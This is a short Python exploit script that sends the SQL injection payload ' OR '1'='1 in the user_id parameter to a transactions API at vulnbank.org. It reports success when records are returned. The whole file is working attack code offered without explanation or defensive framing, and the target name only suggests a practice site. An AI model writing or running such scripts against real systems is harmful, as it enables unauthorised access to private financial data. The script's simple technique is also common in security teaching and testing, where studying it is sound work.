import requests

# Target Configuration
TARGET_URL = "http://vulnbank.org/api/transactions"
PAYLOAD = "' OR '1'='1"


def exploit_sqli():
    print(f"[*] Attempting SQL Injection on {TARGET_URL}...")
    params = {"user_id": PAYLOAD}
    try:
        response = requests.get(TARGET_URL, params=params)
        if response.status_code == 200:
            data = response.json()
            print(f"[+] Exploit Successful! Retrieved {len(data)} items.")
    except Exception as e:
        print(f"[!] Error: {e}")
